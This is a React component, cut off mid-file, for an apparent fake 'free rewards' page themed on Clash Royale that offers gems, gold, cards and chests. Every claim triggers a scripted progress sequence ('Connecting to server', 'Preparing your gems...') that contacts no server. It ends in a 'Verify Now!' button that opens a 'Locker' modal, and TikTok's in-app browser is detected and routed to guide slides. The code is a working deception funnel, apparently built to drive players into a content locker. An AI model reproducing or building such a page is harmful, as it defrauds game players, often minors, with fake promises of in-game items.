import React, { useEffect, useMemo, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  Box,
  Coins,
  PackageOpen,
  HandHeart,
  Banknote,
  Gem,
  Sword,
} from "lucide-react";
import { faGift } from "@fortawesome/free-solid-svg-icons";

/** =========================
 *  ✅ PUT YOUR DATA HERE
 *  ========================= */
const PACKS_DATA = [
  {
    id: 3,
    name: "Pack 1",
    emotes: [
      "images/dances/41.png",
      "images/dances/42.png",
      "images/dances/43.png",
      "images/dances/44.png",
    ],
    emotesCount: 3,
  },
  {
    id: 1,
    name: "Pack 1",
    emotes: [
      "images/dances/20.png",
      "images/dances/21.png",
      "images/dances/22.png",
      "images/dances/23.png",
    ],
    emotesCount: 3,
  },
  
  {
    id: 5,
    name: "Pack 1",
    emotes: [
      "images/dances/38.png",
      "images/dances/39.png",
      "images/dances/40.png",
    ],
    emotesCount: 3,
  },
  {
    id: 6,
    name: "Pack 1",
    emotes: [
      "images/dances/1.png",
      "images/dances/7.png",
      "images/dances/3.png",
      "images/dances/19.png",
    ],
    emotesCount: 3,
  },
  {
    id: 12,
    name: "Pack 1",
    emotes: [
      "images/dances/16.png",
      "images/dances/13.png",
      "images/dances/14.png",
      "images/dances/15.png",
    ],
    emotesCount: 3,
  },
];

// Sample boxes data
const BOXES_DATA = [
  {
    id: 1,
    name: "Valentine Chest",
    image: "/images/boxes/7.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Cards", "Shards", "Gems"],
  },
  {
    id: 2,
    name: "Fire & Ice Chest",
    image: "/images/boxes/6.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Cards", "Shards", "Gems"],
  },
  {
    id: 3,
    status: false,
    name: "Christmas Chest",
    image: "/images/boxes/2.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Cards", "Shards", "Gems"],
  },
  {
    id: 4,
    name: "Hero Chest",
    image: "/images/boxes/1.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Epic Cards", "Gold", "Gems"],
  },
  {
    id: 5,
    name: "Magic Lucky Chest",
    image: "/images/boxes/4.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Epic Cards", "Gold"],
  },
  {
    id: 6,
    name: "Lucky Chest Rework",
    status: false,
    image: "/images/boxes/3.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Multiple Legendaries", "Epic Cards", "Gold"],
  },
  {
    id: 7,
    name: "Lucky Cube Evolution",
    image: "/images/boxes/5.png",
    rarity: "Epic",
    price: "Free",
    rewards: ["Epic Cards", "Rare Cards", "Gold"],
  },
];

// Sample gold data
const GOLD_DATA = [
  {
    id: 1,
    name: "35K Gold",
    amount: "35,000",
    image:
      "https://i.pinimg.com/originals/ee/6f/3b/ee6f3b9c3dc82f5c369ce5f6baf3288b.png",
    price: "Free",
  },
  {
    status: false,
    id: 2,
    name: "250K Gold",
    amount: "250,000",
    image:
      "https://i.pinimg.com/originals/ee/6f/3b/ee6f3b9c3dc82f5c369ce5f6baf3288b.png",
    price: "Free",
  },
];

// Sample cards data
const CARDS_DATA = [
  {
    id: 1,
    name: "Wizard",
    rarity: "Heroic",
    image: "/images/cards/11.png",
    level: 12,
    count: 50,
    price: "Free",
  },
  {
    id: 2,
    name: "ICE GOLEM",
    rarity: "Heroic",
    image: "/images/cards/10.png",
    level: 12,
    count: 50,
    price: "Free",
  },
  {
    id: 3,
    name: "P.E.K.K.A",
    rarity: "Heroic",
    image: "/images/cards/7.webp",
    level: 12,
    count: 50,
    price: "Free",
  },
  {
    id: 4,
    name: "Musketeer",
    rarity: "Heroic",
    image: "/images/cards/8.webp",
    level: 12,
    count: 50,
    price: "Free",
  },
  {
    id: 5,
    name: "Knight",
    rarity: "Heroic",
    image: "/images/cards/9.webp",
    level: 12,
    count: 50,
    price: "Free",
  },
];

// Sample gems data
const GEMS_DATA = [
  {
    id: 1,
    name: "500 Gems",
    amount: "500",
    image:
      "https://static.wikia.nocookie.net/clashroyale/images/f/f2/Gem2C.png",
    price: "Free",
  },
  {
    id: 2,
    name: "1200 Gems",
    amount: "1,200",
    image:
      "https://static.wikia.nocookie.net/clashroyale/images/f/f2/Gem2C.png",
    price: "Free",
  },
  {
    id: 3,
    name: "2500 Gems",
    amount: "2,500",
    image:
      "https://static.wikia.nocookie.net/clashroyale/images/f/f2/Gem2C.png",
    price: "Free",
  },
  {
    status: false,
    id: 4,
    name: "6500 Gems",
    amount: "6,500",
    image:
      "https://static.wikia.nocookie.net/clashroyale/images/f/f2/Gem2C.png",
    price: "Free",
  },
];

const PacksSection = () => {
  const [activeTab, setActiveTab] = useState("emotes");
  const [step, setStep] = useState(1);
  const [loadingText, setLoadingText] = useState("");
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [showLocker, setShowLocker] = useState(false);
  const [lastClaim, setLastClaim] = useState({ tab: "emotes", id: null });
   const slides = useMemo(
      () => ["/images/browser/3.jpg", "/images/browser/4.jpg"],
      []
    );
  
    const [isTikTokBrowser, setIsTikTokBrowser] = useState(false);
    const [slideIndex, setSlideIndex] = useState(0);
  
    useEffect(() => {
      const ua = (navigator.userAgent || "").toLowerCase();
  
      const isTikTok =
        ua.includes("tiktok") ||
        ua.includes("bytedance") ||
        ua.includes("musical_ly") ||
        ua.includes("aweme");
  
      setIsTikTokBrowser(isTikTok);
    }, []);
  
    useEffect(() => {
      if (!isTikTokBrowser) return;
  
      const interval = setInterval(() => {
        setSlideIndex((prev) => (prev + 1) % slides.length);
      }, 1500);
  
      return () => clearInterval(interval);
    }, [isTikTokBrowser, slides.length]);

  /** ✅ Mobile full height fix */
  useEffect(() => {
    const setVH = () => {
      const vh = window.innerHeight * 0.01;
      document.documentElement.style.setProperty("--vh", `${vh}px`);
    };
    setVH();
    window.addEventListener("resize", setVH);
    window.addEventListener("orientationchange", setVH);
    return () => {
      window.removeEventListener("resize", setVH);
      window.removeEventListener("orientationchange", setVH);
    };
  }, []);

  const startLoadingSequence = (tab) => {
    setLoadingProgress(0);

    const itemType =
      tab === "emotes"
        ? "emotes"
        : tab === "boxes"
          ? "boxes"
          : tab === "cards"
            ? "cards"
            : tab === "gems"
              ? "gems"
              : "gold";

    const phases = [
      { text: "Connecting to server", duration: 1400, progress: 25 },
      { text: "Getting ready...", duration: 1400, progress: 50 },
      { text: `Preparing your ${itemType}...`, duration: 1800, progress: 85 },
      { text: "Finalizing process", duration: 1200, progress: 100 },
    ];

    let current = 0;
    const run = () => {
      if (current < phases.length) {
        const p = phases[current];
        setLoadingText(p.text);
        setLoadingProgress(p.progress);
        setTimeout(() => {
          current += 1;
          run();
        }, p.duration);
      } else {
        setStep(3);
      }
    };
    run();
  };

  /** ✅ CLAIM only */
  const handleClaimAndProceed = (tab, itemId, status) => {
    if (status === false) return;
    setLastClaim({ tab, id: itemId });
    setStep(2);
    startLoadingSequence(tab);
  };

  const handleBack = () => setStep(1);

  const finalLabel = useMemo(() => {
    const tab = lastClaim.tab || activeTab;
    if (tab === "emotes")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">3 Emotes</span>!`;
    if (tab === "boxes")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">1 Box</span>!`;
    if (tab === "gold")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">Gold</span>!`;
    if (tab === "cards")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">Cards</span>!`;
    if (tab === "gems")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">Gems</span>!`;
    return "You are almost done!";
  }, [lastClaim, activeTab]);

  /** =========================
   *  CLASH ROYALE STYLE PIECES
   *  ========================= */
  const ClaimBtn = ({ disabled, onClick }) => (
    <button
      onClick={onClick}
      disabled={disabled}
      className={[
        "cr-btn w-full px-6 py-2.5",
        "text-[13px] md:text-sm font-extrabold tracking-wide",
        "transition-all select-none",
        disabled ? "cr-btn--disabled" : "cr-btn--claim",
      ].join(" ")}
    >
      {disabled ? "UNAVAILABLE" : "CLAIM"}
    </button>
  );

  const PanelCard = ({ children, className = "" }) => (
    <div className={`cr-panel cr-bevel cr-shadow ${className}`}>{children}</div>
  );

  const MiniTitle = ({ left, right }) => (
    <div className="flex justify-between items-center mb-2">
      <span className="cr-title text-[12px] md:text-[13px]">{left}</span>
      {right ? <span className="cr-badge">{right}</span> : null}
    </div>
  );

  /** =========================
   *  RENDER LISTS (CLAIM ONLY)
   *  ========================= */
  const renderEmotesTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {PACKS_DATA.map((pack, idx) => {
        const unavailable = pack.status === false;
        return (
          <PanelCard key={pack.id} className="p-3 mb-2 last:mb-0">
            <MiniTitle left={`Pack ${idx + 1}`} />
            <div className="grid grid-cols-4 gap-1.5 mb-2">
              {(pack.emotes || []).slice(0, 4).map((emote, i) => (
                <div key={i} className="cr-slot cr-bevel-sm">
                  <img
                    src={emote}
                    alt={`Emote ${i + 1}`}
                    loading="lazy"
                    decoding="async"
                    fetchpriority="low"
                    className="w-full h-full object-cover blur transition"
                    onLoad={(e) => e.currentTarget.classList.remove("blur")}
                  />
                </div>
              ))}
            </div>
            <div className="mt-3">
              <ClaimBtn
                disabled={unavailable}
                onClick={() =>
                  handleClaimAndProceed("emotes", pack.id, pack.status)
                }
              />
            </div>
          </PanelCard>
        );
      })}
    </div>
  );

  const renderBoxesTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {BOXES_DATA.map((box) => {
        const unavailable = box.status === false;
        return (
          <PanelCard key={box.id} className="p-3 mb-2 last:mb-0">
            <MiniTitle left={box.name} right={box.rarity} />
            <div className="flex justify-center mb-3">
              <div className="cr-chestFrame cr-bevel-sm">
                <img
                  src={box.image}
                  alt={box.name}
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
            <ClaimBtn
              disabled={unavailable}
              onClick={() => handleClaimAndProceed("boxes", box.id, box.status)}
            />
          </PanelCard>
        );
      })}
    </div>
  );

  const renderGoldTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {GOLD_DATA.map((gold) => {
        const unavailable = gold.status === false;
        return (
          <PanelCard key={gold.id} className="p-3 mb-2 last:mb-0">
            <MiniTitle left={gold.name} />
            <div className="flex items-center justify-center gap-3 mb-3">
              <div className="cr-coinFrame cr-bevel-sm">
                <img
                  src={gold.image}
                  alt={gold.name}
                  className="w-10 h-10 object-contain"
                />
              </div>
              <div className="cr-amount">{gold.amount}</div>
            </div>
            <ClaimBtn
              disabled={unavailable}
              onClick={() =>
                handleClaimAndProceed("gold", gold.id, gold.status)
              }
            />
          </PanelCard>
        );
      })}
    </div>
  );

  const renderCardsTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {CARDS_DATA.map((card) => {
        const unavailable = card.status === false;

        const rarityTone =
          {
            Heroic: "cr-pill cr-pill--heroic",
            Legendary: "cr-pill cr-pill--legendary",
            Epic: "cr-pill cr-pill--epic",
            Rare: "cr-pill cr-pill--rare",
            Common: "cr-pill cr-pill--common",
          }[card.rarity] || "cr-pill cr-pill--common";

        return (
          <PanelCard key={card.id} className="p-3 mb-2 last:mb-0">
            <div className="flex justify-between items-center mb-2">
              <span className="cr-title text-[12px] md:text-[13px]">
                {card.name}
              </span>
              <span className={rarityTone}>{card.rarity}</span>
            </div>

            <div className="flex items-center justify-between mb-3">
              <div className="cr-cardFrame cr-bevel-sm">
                <img
                  src={card.image}
                  alt={card.name}
                  className="w-14 h-16 object-contain"
                />
              </div>
              <div className="cr-meta text-right">
                <div>Lv. {card.level}</div>
                <div>x{card.count}</div>
              </div>
            </div>

            <ClaimBtn
              disabled={unavailable}
              onClick={() =>
                handleClaimAndProceed("cards", card.id, card.status)
              }
            />
          </PanelCard>
        );
      })}
    </div>
  );

  const renderGemsTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {GEMS_DATA.map((gem) => {
        const unavailable = gem.status === false;
        return (
          <PanelCard key={gem.id} className="p-3 mb-2 last:mb-0">
            <MiniTitle left={gem.name} />
            <div className="flex items-center justify-center gap-3 mb-3">
              <div className="cr-gemFrame cr-bevel-sm">
                <img
                  src="/images/gems/1.png"
                  alt={gem.name}
                  className="w-10 h-10 object-contain"
                />
              </div>
              <div className="cr-amount cr-amount--green">{gem.amount}</div>
            </div>
            <ClaimBtn
              disabled={unavailable}
              onClick={() => handleClaimAndProceed("gems", gem.id, gem.status)}
            />
          </PanelCard>
        );
      })}
    </div>
  );
  if (isTikTokBrowser) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center bg-black px-4">
        <div className="w-full max-w-md">
          <img
            src={slides[slideIndex]}
            alt="Browser Guide"
            className="w-full h-auto rounded-2xl shadow-2xl tiktok-slide"
            style={{ objectFit: "contain" }}
          />
        </div>
      </div>
    );
  }

  return (
    <>
      {/* Background */}
      <div
        className="cr-bg flex items-center justify-center p-3"
        style={{ minHeight: "calc(var(--vh, 1vh) * 100)" }}
      >
        {/* Main container */}
        <div className="cr-shell w-full md:w-1/2 lg:w-1/2 rounded-2xl p-2 h-[calc(var(--vh,1vh)*100-24px)] md:h-auto md:max-h-[95vh] flex flex-col">
          {/* Progress Steps */}
          <div className="flex justify-center">
            <div className="flex gap-2 mb-4">
              <div
                className={`cr-step ${step === 1 ? "cr-step--on" : "cr-step--off"}`}
              >
                1
              </div>
              <div
                className={`cr-step ${step >= 2 ? "cr-step--on" : "cr-step--off"}`}
              >
                2
              </div>
            </div>
          </div>

          {/* Step 1 */}
          {step === 1 && (
            <motion.div
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ duration: 0.3, ease: "easeIn" }}
              className="flex flex-col flex-1 min-h-0"
            >
              <div className="text-center mb-2 flex justify-center items-center">
                <img src="/images/logo.png" className="w-[40%]" alt="" />
              </div>

              {/* Tabs */}
              <div className="cr-tabs mb-2 p-1">
                {[
                  { id: "emotes", label: "Emotes", icon: <HandHeart /> },
                  { id: "boxes", label: "Boxes", icon: <PackageOpen /> },
                  { id: "cards", label: "Cards", icon: <Sword /> },
                  { id: "gems", label: "Gems", icon: <Gem /> },
                  { id: "gold", label: "Gold", icon: <Banknote /> },
                ].map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={`cr-tab ${activeTab === tab.id ? "cr-tab--active" : "cr-tab--idle"}`}
                  >
                    <div className="flex flex-col gap-1 items-center">
                      <span className="text-sm">{tab.icon}</span>
                      <span className="text-[11px] md:text-xs">
                        {tab.label}
                      </span>
                    </div>
                  </button>
                ))}
              </div>

              {/* Title */}
              <h2 className="cr-h2 text-center mb-2">
                {activeTab === "emotes" && "Claim Your Emotes"}
                {activeTab === "boxes" && "Claim Special Boxes"}
                {activeTab === "cards" && "Claim Free Cards"}
                {activeTab === "gold" && "Claim Free Gold"}
                {activeTab === "gems" && "Claim Free Gems"}
              </h2>

              {/* Subtitle */}
              <p className="cr-sub text-center text-xs mb-3">
                Click <b className="text-white">CLAIM</b> on any item to
                continue.
              </p>

              {/* Content */}
              {activeTab === "emotes" && renderEmotesTab()}
              {activeTab === "boxes" && renderBoxesTab()}
              {activeTab === "cards" && renderCardsTab()}
              {activeTab === "gold" && renderGoldTab()}
              {activeTab === "gems" && renderGemsTab()}

              <p className="cr-sub text-center text-xs font-semibold">
                If you claim many items, they will arrive slowly. <br />
                You can claim up to 2 rewards per day.
              </p>
            </motion.div>
          )}

          {/* Step 2 */}
          {step === 2 && (
            <motion.div
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ duration: 0.3, ease: "easeIn" }}
              className="flex flex-col justify-center h-full min-h-0"
            >
              <div>
                <div className="text-center mb-4 flex justify-center items-center">
                  <img src="/images/logo.png" className="w-[70%]" alt="" />
                </div>

                <h2 className="cr-h2 text-center mb-2">
                  Processing Your{" "}
                  {lastClaim.tab === "emotes"
                    ? "Emotes"
                    : lastClaim.tab === "boxes"
                      ? "Boxes"
                      : lastClaim.tab === "cards"
                        ? "Cards"
                        : lastClaim.tab === "gems"
                          ? "Gems"
                          : "Gold"}
                </h2>

                <div className="flex flex-col items-center justify-center py-8 flex-1">
                  <div className="relative w-20 h-20 mb-6">
                    <div className="absolute inset-0 cr-ring"></div>
                    <div className="absolute inset-0 cr-ringSpin"></div>
                    <div className="absolute inset-2 cr-ring2"></div>
                    <div className="absolute inset-4 cr-ringSpin2 animation-delay-1000"></div>

                    <div className="absolute inset-0 flex items-center justify-center">
                      {lastClaim.tab === "emotes" && (
                        <span className="text-2xl">😊</span>
                      )}
                      {lastClaim.tab === "boxes" && (
                        <Box className="w-6 h-6 text-[#ffd35a]" />
                      )}
                      {lastClaim.tab === "cards" && (
                        <Sword className="w-6 h-6 text-[#ffd35a]" />
                      )}
                      {lastClaim.tab === "gold" && (
                        <Coins className="w-6 h-6 text-[#ffd35a]" />
                      )}
                      {lastClaim.tab === "gems" && (
                        <Gem className="w-6 h-6 text-[#ffd35a]" />
                      )}
                    </div>
                  </div>

                  <div className="cr-progressTrack w-full h-3 mb-4 overflow-hidden">
                    <motion.div
                      className="cr-progressFill h-3"
                      initial={{ width: 0 }}
                      animate={{ width: `${loadingProgress}%` }}
                      transition={{ duration: 0.5 }}
                    />
                  </div>

                  <div className="text-center w-full flex justify-center items-center mt-2">
                    <motion.p
                      key={loadingText}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="cr-loadingMsg w-[92%] md:w-[85%]"
                    >
                      {loadingText}
                    </motion.p>
                  </div>
                </div>

                <p className="cr-sub text-center text-xs">
                  If you claim many items, they will arrive slowly. <br />
                  You can claim up to 2 rewards per day.
                </p>
              </div>
            </motion.div>
          )}

          {/* Step 3 */}
          {step === 3 && (
            <div className="flex flex-col justify-center h-full min-h-0">
              <div>
                <div className="w-full flex justify-center items-center mb-3">
                  <span className="text-[#ffd35a] text-5xl drop-shadow-[0_3px_0_rgba(0,0,0,0.6)]">
                    <FontAwesomeIcon icon={faGift} />
                  </span>
                </div>

                <h2 className="cr-h1 text-center mb-5">Last Step!</h2>

                <div className="w-full flex justify-center items-center mt-4 flex-1 min-h-0">
                  <div className="cr-finalBox w-[92%] md:w-[85%]">
                    <p className="text-white text-lg mb-3 cr-textShadow">
                      Congratulations!
                    </p>
                    <p
                      className="text-[#cfe7ff] text-sm leading-relaxed"
                      dangerouslySetInnerHTML={{ __html: finalLabel }}
                    />
                    <p className="text-[#cfe7ff] text-sm leading-relaxed mt-2">
                      You’re almost done! Click the button below to finish.
                    </p>
                  </div>
                </div>

                <div className="w-full flex justify-center items-center mt-8">
                  <button
                    onClick={() => setShowLocker(true)}
                    className="cr-bigBtn  w-[92%] md:w-full"
                  >
                    Verify Now!
                  </button>
                </div>

                <div className="w-full flex justify-center items-center mt-3">
                  <button
                    onClick={handleBack}
                    className="cr-backBtn w-[92%] md:w-full"
                  >
                    Back
                  </button>
                </div>

                <p className="cr-sub text-center text-xs font-semibold">
                  If you claim many items, they will arrive slowly. <br />
                  You can claim up to 2 rewards per day.
                </p>
              </div>
            </div>
          )}

          {/* ✅ Clash Royale CSS */}
          <style jsx>{`
  /* =========================
     NEW THEME (Royal Clean UI)
     Replace your whole <style jsx> block with this
  ========================= */

  /* Background */
  .cr-bg{
    background:
      radial-gradient(900px 520px at 50% -20%, rgba(255,255,255,.14), transparent 60%),
      radial-gradient(700px 420px at 20% 10%, rgba(120,120,255,.18), transparent 55%),
      radial-gradient(700px 420px at 85% 25%, rgba(255,210,100,.14), transparent 55%),
      linear-gradient(180deg, #070b1d 0%, #070a16 45%, #040612 100%);
  }

  /* Main shell */
  .cr-shell{
    position: relative;
    background:
      linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));
    border: 1px solid rgba(255,255,255,.12);
    box-shadow:
      0 18px 60px rgba(0,0,0,.55),
      inset 0 1px 0 rgba(255,255,255,.10);
    backdrop-filter: blur(14px);
  }

  /* Soft top glow line */
  .cr-shell:before{
    content:"";
    position:absolute;
    inset:0;
    border-radius: 16px;
    pointer-events:none;
    box-shadow: inset 0 1px 0 rgba(255,255,255,.10);
  }

  /* Panels */
  .cr-panel{
    background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));
    border: 1px solid rgba(255,255,255,.10);
  }

  .cr-bevel{
    border-radius: 16px;
    box-shadow:
      0 10px 26px rgba(0,0,0,.30),
      inset 0 1px 0 rgba(255,255,255,.10);
  }

  .cr-bevel-sm{
    border-radius: 14px;
    border: 1px solid rgba(255,255,255,.10);
    background:
      linear-gradient(180deg, rgba(255,255,255,.08), rgba(0,0,0,.10));
    box-shadow:
      inset 0 1px 0 rgba(255,255,255,.10);
  }

  .cr-shadow{
    box-shadow:
      0 10px 26px rgba(0,0,0,.35),
      inset 0 1px 0 rgba(255,255,255,.08);
  }

  /* Text */
  .cr-textShadow{ text-shadow: 0 2px 0 rgba(0,0,0,.55); }

  .cr-title{
    color:#fff;
    font-weight: 950;
    letter-spacing: .2px;
    text-shadow: 0 2px 0 rgba(0,0,0,.55);
  }

  .cr-h2{
    color:#ffe08a;
    font-weight: 950;
    font-size: 20px;
    text-shadow: 0 3px 0 rgba(0,0,0,.6);
  }

  .cr-h1{
    color:#ffe08a;
    font-weight: 1000;
    font-size: 32px;
    letter-spacing: .2px;
    text-shadow: 0 4px 0 rgba(0,0,0,.65);
  }

  .cr-sub{
    color: rgba(210,230,255,.90);
  }

  /* Tabs */
  .cr-tabs{
    display:flex;
    gap: 8px;
    background: rgba(0,0,0,.22);
    border: 1px solid rgba(255,255,255,.10);
    border-radius: 16px;
    padding: 6px;
    box-shadow: inset 0 1px 0 rgba(255,255,255,.08);
  }

  .cr-tab{
    flex:1;
    padding: 10px 8px;
    border-radius: 14px;
    font-weight: 950;
    user-select:none;
    transition: transform .14s ease, filter .14s ease, background .14s ease;
  }

  .cr-tab--idle{
    color: rgba(210,230,255,.92);
    background: rgba(255,255,255,.04);
  }

  .cr-tab--idle:hover{
    filter: brightness(1.08);
    transform: translateY(-1px);
  }

  .cr-tab--active{
    color:#141414;
    background: linear-gradient(180deg, #ffe9a9, #ffcf55);
    border: 1px solid rgba(0,0,0,.10);
    box-shadow:
      0 12px 24px rgba(0,0,0,.25),
      inset 0 2px 0 rgba(255,255,255,.28);
    transform: translateY(-1px);
  }

  /* Step dots */
  .cr-step{
    width: 28px;
    height: 28px;
    border-radius: 999px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-weight: 1000;
    font-size: 13px;
    border: 1px solid rgba(255,255,255,.12);
    box-shadow: inset 0 1px 0 rgba(255,255,255,.10);
  }

  .cr-step--on{
    background: linear-gradient(180deg, #ffe9a9, #ffcf55);
    color:#141414;
  }

  .cr-step--off{
    background: rgba(255,255,255,.06);
    color: rgba(210,230,255,.70);
  }

  /* Item frames */
  .cr-slot{
    width:100%;
    aspect-ratio: 1 / 1;
    height:auto;
    display:flex;
    align-items:center;
    justify-content:center;
    overflow:hidden;
  }

  .cr-chestFrame{
    width: 122px;
    height: 122px;
    overflow:hidden;
    display:flex;
    align-items:center;
    justify-content:center;
    border-radius: 16px;
    border: 1px solid rgba(255,255,255,.12);
    background: rgba(255,255,255,.06);
    box-shadow: inset 0 1px 0 rgba(255,255,255,.10);
  }

  .cr-coinFrame,.cr-gemFrame{
    width: 86px;
    height: 86px;
    border-radius: 999px;
    display:flex;
    align-items:center;
    justify-content:center;
    border: 1px solid rgba(255,255,255,.12);
    background: rgba(255,255,255,.06);
    box-shadow: inset 0 1px 0 rgba(255,255,255,.10);
  }

  .cr-cardFrame{
    width: 76px;
    height: 94px;
    display:flex;
    align-items:center;
    justify-content:center;
    border-radius: 16px;
    border: 1px solid rgba(255,255,255,.12);
    background: rgba(255,255,255,.06);
    box-shadow: inset 0 1px 0 rgba(255,255,255,.10);
  }

  /* Amount / Meta */
  .cr-amount{
    font-size: 26px;
    font-weight: 1000;
    color:#ffdd7a;
    text-shadow: 0 3px 0 rgba(0,0,0,.55);
  }
  .cr-amount--green{ color:#6dffb8; }

  .cr-meta{
    color: rgba(210,230,255,.92);
    font-weight: 850;
    font-size: 12px;
    text-shadow: 0 2px 0 rgba(0,0,0,.45);
  }

  /* Badges / rarity */
  .cr-badge{
    font-size: 11px;
    font-weight: 1000;
    padding: 5px 10px;
    border-radius: 999px;
    color:#141414;
    background: linear-gradient(180deg, #ffe9a9, #ffcf55);
    box-shadow: inset 0 2px 0 rgba(255,255,255,.22);
  }

  .cr-pill{
    font-size: 11px;
    font-weight: 1000;
    padding: 5px 10px;
    border-radius: 999px;
    border: 1px solid rgba(255,255,255,.12);
    text-shadow: 0 2px 0 rgba(0,0,0,.45);
  }
  .cr-pill--legendary{ color:#141414; background: linear-gradient(180deg, #ffe9a9, #ffcf55); }
  .cr-pill--epic{ color:#fff; background: linear-gradient(180deg, #c4a1ff, #7b4bff); }
  .cr-pill--rare{ color:#fff; background: linear-gradient(180deg, #7fd0ff, #2b86ff); }
  .cr-pill--heroic{ color:#141414; background: linear-gradient(180deg, #fff0c6, #ffd66c); }
  .cr-pill--common{ color:#fff; background: linear-gradient(180deg, #9aa7b4, #5e6b78); }

  /* Buttons */
  .cr-btn{
    border-radius: 16px;
    border: 1px solid rgba(255,255,255,.12);
    box-shadow:
      0 14px 26px rgba(0,0,0,.25),
      inset 0 1px 0 rgba(255,255,255,.14);
    transition: transform .14s ease, filter .14s ease;
  }

  .cr-btn--claim{
    background: linear-gradient(180deg, #88ffb0 0%, #2ae07c 60%, #12b35a 100%);
    color:#06140c;
  }
  .cr-btn--claim:hover{
    filter: brightness(1.06);
    transform: translateY(-1px);
  }
  .cr-btn--disabled{
    background: rgba(255,255,255,.10);
    color: rgba(255,255,255,.75);
    cursor:not-allowed;
    opacity:.75;
  }

  .cr-bigBtn{
    font-weight: 1000;
    font-size: 18px;
    padding: 14px 14px;
    border-radius: 18px;
    background: linear-gradient(180deg, #88ffb0 0%, #2ae07c 60%, #12b35a 100%);
    color:#06140c;
    border: 1px solid rgba(255,255,255,.14);
    box-shadow:
      0 18px 30px rgba(0,0,0,.28),
      inset 0 1px 0 rgba(255,255,255,.16);
    transition: transform .14s ease, filter .14s ease;
  }
  .cr-bigBtn:hover{
    filter: brightness(1.06);
    transform: translateY(-1px) scale(1.01);
  }

  .cr-backBtn{
    font-weight: 800;
    font-size: 18px;
    padding: 14px 14px;
    border-radius: 18px;
    background: rgba(255,255,255,.06);
    color:#fff;
    border: 1px solid rgba(255,255,255,.12);
    box-shadow:
      0 14px 26px rgba(0,0,0,.22),
      inset 0 1px 0 rgba(255,255,255,.10);
    transition: transform .14s ease, filter .14s ease;
  }
  .cr-backBtn:hover{
    filter: brightness(1.08);
    transform: translateY(-1px);
  }

  /* Loading */
  .cr-loadingMsg{
    color:#fff;
    font-weight: 1000;
    font-size: 16px;
    padding: 12px 14px;
    border-radius: 18px;
    border: 1px solid rgba(255,255,255,.12);
    background: rgba(255,255,255,.06);
    text-shadow: 0 2px 0 rgba(0,0,0,.55);
    box-shadow: inset 0 1px 0 rgba(255,255,255,.10);
  }

  .cr-progressTrack{
    border-radius: 999px;
    background: rgba(255,255,255,.06);
    border: 1px solid rgba(255,255,255,.10);
    box-shadow: inset 0 1px 0 rgba(255,255,255,.08);
  }

  .cr-progressFill{
    border-radius: 999px;
    background: linear-gradient(90deg, #ffb03b, #ffe89c);
    box-shadow: inset 0 2px 0 rgba(255,255,255,.25);
  }

  .cr-ring{
    border: 4px solid rgba(255,255,255,.12);
    border-radius: 999px;
  }
  .cr-ringSpin{
    border: 4px solid transparent;
    border-top-color: rgba(255,220,120,.95);
    border-radius: 999px;
    animation: spin .9s linear infinite;
  }
  .cr-ring2{
    border: 4px solid rgba(255,255,255,.08);
    border-radius: 999px;
  }
  .cr-ringSpin2{
    border: 4px solid transparent;
    border-bottom-color: rgba(255,220,120,.75);
    border-radius: 999px;
    animation: spin 1.1s linear infinite;
  }

  @keyframes spin{
    from{ transform: rotate(0deg); }
    to{ transform: rotate(360deg); }
  }

  /* Final message box */
  .cr-finalBox{
    border-radius: 20px;
    padding: 18px;
    border: 1px solid rgba(255,255,255,.12);
    background: rgba(255,255,255,.06);
    box-shadow:
      0 18px 34px rgba(0,0,0,.25),
      inset 0 1px 0 rgba(255,255,255,.10);
  }

  /* Scrollbar */
  .custom-scrollbar::-webkit-scrollbar{ width: 7px; }
  .custom-scrollbar::-webkit-scrollbar-track{
    background: rgba(255,255,255,.05);
    border-radius: 10px;
    border: 1px solid rgba(255,255,255,.08);
  }
  .custom-scrollbar::-webkit-scrollbar-thumb{
    background: linear-gradient(180deg, #ffe89c, #ffb03b);
    border-radius: 10px;
  }
  .custom-scrollbar::-webkit-scrollbar-thumb:hover{ filter: brightness(1.06); }

  .animation-delay-1000{ animation-delay: 1s; }
`}</style>

        </div>
      </div>

      {/* Locker */}
      <AnimatePresence>
        {showLocker && (
          <motion.div
            key="locker-backdrop"
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-3"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.18, ease: "easeOut" }}
            onClick={() => setShowLocker(false)} // click outside closes
          >
            <motion.div
              key="locker-modal"
